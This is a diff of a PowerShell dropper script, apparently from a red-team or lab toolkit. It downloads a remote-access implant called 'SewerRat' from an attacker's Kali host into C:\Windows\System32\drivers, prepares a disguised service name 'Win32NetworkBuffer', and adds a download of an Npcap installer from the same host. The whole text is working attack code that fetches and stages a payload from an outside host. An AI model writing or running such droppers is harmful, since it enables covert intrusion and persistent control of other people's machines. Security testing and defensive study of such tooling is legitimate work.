@@ -4,15 +4,36 @@
 # ============================================================================
 
 $KaliIP = "192.168.1.223" # TODO: CHANGE THIS to your Kali IP
-$KaliPort = "8080"
+$KaliPort = "80"
 $ImplantURL = "http://${KaliIP}:${KaliPort}/dist/SewerRat.exe"
 $DestPath = "C:\Windows\System32\drivers\SewerRat.exe"
+# $DeployScript = "http://${KaliIP}:${KaliPort}/scripts/deploy.ps1"
+# $DestPath2 = "C:\Windows\System32\drivers\deploy.ps1"
+$Npcapexe = "http://${KaliIP}:${KaliPort}/npcap-1.87.exe"
+$DestPath3 = "C:\Windows\System32\drivers\npcap-1.87.exe"
 $ServiceName = "Win32NetworkBuffer"
 
 Write-Host "[*] Downloading SewerRat implant from $ImplantURL..."
 try {
     Invoke-WebRequest -Uri $ImplantURL -OutFile $DestPath -UseBasicParsing
     Write-Host "[+] Download successful: $DestPath"
+} catch {
+    Write-Host "[-] Download failed: $_"
+    exit
+}
+
+# Write-Host "[*] Getting deployment script for SewerRat from $DeployScript..."
+# try {
+#     Invoke-WebRequest -Uri $DeployScript -OutFile $DestPath2 -UseBasicParsing
+#     Write-Host "[+] Download successful: $DestPath2"
+# } catch {
+#     Write-Host "[-] Download failed: $_"
+#     exit
+# }
+Write-Host "[*] Getting Npcap installer from $Npcapexe..."
+try {
+    Invoke-WebRequest -Uri $Npcapexe -OutFile $DestPath3 -UseBasicParsing
+    Write-Host "[+] Download successful: $DestPath3"
 } catch {
     Write-Host "[-] Download failed: $_"
     exit
